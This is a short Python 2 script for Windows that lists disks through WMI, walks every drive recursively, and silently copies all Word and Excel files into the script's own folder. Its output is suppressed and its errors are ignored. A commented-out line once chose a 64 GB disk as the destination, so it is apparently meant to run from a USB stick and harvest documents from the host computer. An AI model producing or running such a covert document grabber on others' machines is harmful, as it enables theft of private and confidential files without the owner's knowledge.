#coding:utf-8
try:
    import cPickle as pickle
except ImportError:
    import pickle
import os, sys 
import time 
import wmi 
import shutil
######################################################################## 
#function 
######################################################################## 
def get_disk_info(): 
     """ 
     获取物理磁盘信息。 
     """
     tmplist = [] 
     c = wmi.WMI () 
     for physical_disk in c.Win32_DiskDrive (): 
         tmpdict = {} 
         tmpdict["Caption"] = physical_disk.Caption 
         tmpdict["Size"] = long(physical_disk.Size)/1024/1024/1024
         tmplist.append(tmpdict) 
     return tmplist 
def get_fs_info() : 
     """ 
     获取文件系统信息。 
     包含分区的大小、已用量、可用量、使用率、挂载点信息。 
     """
     tmplist = [] 
     c = wmi.WMI () 
     for physical_disk in c.Win32_DiskDrive (): 
         for partition in physical_disk.associators ("Win32_DiskDriveToDiskPartition"): 
             for logical_disk in partition.associators ("Win32_LogicalDiskToPartition"): 
                 tmpdict = {} 
                 tmpdict["Caption"] = logical_disk.Caption 
                 tmpdict["DiskTotal"] = long(logical_disk.Size)/1024/1024/1024
                 tmpdict["UseSpace"] = (long(logical_disk.Size)-long(logical_disk.FreeSpace))/1024/1024/1024
                 tmpdict["FreeSpace"] = long(logical_disk.FreeSpace)/1024/1024/1024
                 tmpdict["Percent"] = int(100.0*(long(logical_disk.Size)-long(logical_disk.FreeSpace))/long(logical_disk.Size)) 
                 tmplist.append(tmpdict) 
     return tmplist 
def CheckPath(cpath,tpath):
    t=[]
    for x in os.listdir(cpath):
        if os.path.splitext(x)[1]==".xlsx" or os.path.splitext(x)[1]==".xls"\
        or os.path.splitext(x)[1]==".docx" or os.path.splitext(x)[1]==".doc":
            t.append(os.path.join(cpath,x))
        if os.path.isdir(os.path.join(cpath,x)):
            try:
                CheckPath(os.path.join(cpath,x),tpath)
            except:
                pass
    if t!=[]:
        for y in t:
            #print os.path.normpath(y.decode('gbk'))
            shutil.copy(os.path.normpath(y.decode('gbk')),tpath)

if __name__ == "__main__": 
    disk = get_disk_info() 
    #print disk 
    #print '--------------------------------------'
    fs = get_fs_info() 
    #print fs
    kk=[]
    kkk=""
    for k in fs:
        kk.append(k["Caption"])
        """之前用的获取输出目录的方法
        if k["DiskTotal"]==64L:
            kkk=k["Caption"]
        """
    #print kk
    #tpath=os.path.join(kkk.decode('string-escape'),"\\2") 之前用的获取输出目录的方法
    #print tpath
    tpath=os.path.split(os.path.realpath(__file__))[0]
    for k in kk:
        #print k
        CheckPath(k.decode('string-escape'),tpath)

    